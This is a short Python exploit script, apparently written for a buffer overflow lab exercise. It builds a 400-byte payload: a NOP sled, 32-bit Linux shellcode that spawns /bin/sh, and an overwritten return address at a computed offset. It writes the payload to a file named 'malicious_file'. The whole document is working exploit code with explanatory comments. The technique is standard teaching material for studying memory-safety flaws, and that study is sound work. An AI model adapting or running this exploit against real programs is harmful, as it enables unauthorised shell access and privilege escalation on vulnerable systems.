#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0"   # xorl %eax,%eax
  "\x50"       # pushl %eax
  "\x68""//sh" # pushl $0x68732f2f
  "\x68""/bin" # pushl $0x6e69622f
  "\x89\xe3"   # movl %esp,%ebx
  "\x50"       # pushl %eax
  "\x53"       # pushl %ebx
  "\x89\xe1"   # movl %esp,%ecx
  "\x99"       # cdq
  "\xb0\x0b"   # movb $0x0b,%al
  "\xcd\x80"   # int $0x80
).encode('latin-1')

# Filling the content with NOP's
content = bytearray(0x90 for i in range(400))

# Putting the shellcode by the end of content
start = 400 - len(shellcode)  
content[start:start + len(shellcode)] = shellcode

# Setting the return address
ret    = 0xffffcff0  + 100  # ret = base address of str + bytes allocated to str
offset = 108 + 4            # offset = (difference between the frame pointer register and the base address of str) + bytes allocated to the return address

# Inserting the return address in content
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 

# Exporting content to a file
with open('malicious_file', 'wb') as f:
  f.write(content)
